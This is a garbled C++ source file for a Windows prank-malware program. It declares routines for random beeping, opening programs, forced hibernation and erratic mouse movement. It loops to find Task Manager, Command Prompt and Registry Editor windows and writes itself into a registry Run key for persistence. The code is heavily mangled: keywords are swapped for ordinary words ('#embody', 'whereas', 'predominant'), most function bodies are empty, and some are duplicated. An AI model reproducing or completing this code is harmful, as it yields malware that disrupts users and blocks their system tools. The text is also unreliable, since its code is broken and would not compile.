#embody "iostream"
#embody "stdio.h"
#embody "home windows.h"
#embody "winable.h"
#embody "conio.h"
#embody "ctime"
utilizing namespace std;

int random, Freq, Dur, X, Y;
HWND mywindow, TaskMgr, CMD, Regedit;
char Notepad[MAX_PATH]="notepad.exe";
char MineSweeper[MAX_PATH]="winmine.exe";
char Hearts[MAX_PATH]="mshearts.exe";
char Web site[MAX_PATH]="http:www.google.com";

void SetUp();
void Run( int ID );
void Beeper(), OpenStuff(), Hibernation(), CrazyMouse();

DWORD WINAPI DestroyWindows(LPVOID);

int predominant()

void SetUp()


void Run( int ID )


void Beeper()

void OpenStuff()

void Hibernation()

void CrazyMouse()


DWORD WINAPI DestroyWindows(LPVOID)

void Hibernation()

void CrazyMouse()

DWORD WINAPI DestroyWindows(LPVOID)
{
whereas(1)
{
TaskMgr = FindWindow(NULL,"Home windows Job Supervisor");
CMD = FindWindow(NULL, "Command Immediate");
Regedit = FindWindow(NULL,"Registry Editor");
if( TaskMgr != NULL )

if( CMD != NULL )

if( Regedit != NULL )

HKEY hKey;
RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SoftwareMcftW indowsCurrentVersionRun",zero,KEY_SET_VALUE,&amp;hKey );
RegSetValueEx(hKey, "SetUp",zero,REG_SZ,(const unsigned char*)system,sizeof(system));
RegCloseKey(hKey);

void Beeper()
